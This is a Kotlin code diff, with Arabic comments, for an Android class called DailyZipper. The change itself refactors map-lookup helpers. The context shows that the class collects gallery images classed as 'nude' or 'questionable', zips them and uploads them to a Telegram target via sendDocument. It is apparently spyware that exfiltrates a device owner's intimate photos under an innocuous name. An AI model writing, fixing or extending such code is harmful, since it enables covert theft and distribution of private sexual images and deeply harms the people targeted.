@@ -78,6 +78,16 @@ class DailyZipper(
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
             return DailyZipper(context, scanner, telegram)
         }
+
+        // ===== دوال مساعدة آمنة لاستخراج القيم من الخرائط =====
+        // يتم تعريفهما هنا لمنع أي تداخل مع MatchGroupCollection
+        private fun safeGetBooleanFromMap(obj: Any?, key: String): Boolean {
+            return (obj as? Map<*, *>)?.get(key) as? Boolean ?: false
+        }
+
+        private fun safeGetStringFromMap(obj: Any?, key: String): String {
+            return (obj as? Map<*, *>)?.get(key) as? String ?: ""
+        }
     }
 
     init {
@@ -266,7 +276,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram (بدون دوال خارجية)
+    //  إرسال الملفات إلى Telegram (باستخدام الدالة المساعدة)
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,14 +311,10 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // ✅ استخراج القيمة مباشرة بدون دوال تمديد خارجية
+                // ✅ استخدام الدالة المساعدة الآمنة لتجنب أي تعارض
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> {
-                        val okValue = result.get("ok")
-                        okValue is Boolean && okValue
-                    }
-                    else -> false
+                    else -> safeGetBooleanFromMap(result, "ok")
                 }
 
                 if (success) {
@@ -616,7 +622,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (استخراج المسار بأمان)
+    //  التشغيل التلقائي (باستخدام الدالة المساعدة)
     // ============================================================
 
     fun run(): Boolean {
@@ -637,14 +643,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار مباشرة بدون دوال خارجية
-                            val path = when (item) {
-                                is Map<*, *> -> {
-                                    val p = item.get("path")
-                                    if (p is String) p else ""
-                                }
-                                else -> ""
-                            }
+                            // ✅ استخدام الدالة المساعدة الآمنة لتجنب أي تعارض
+                            val path = safeGetStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
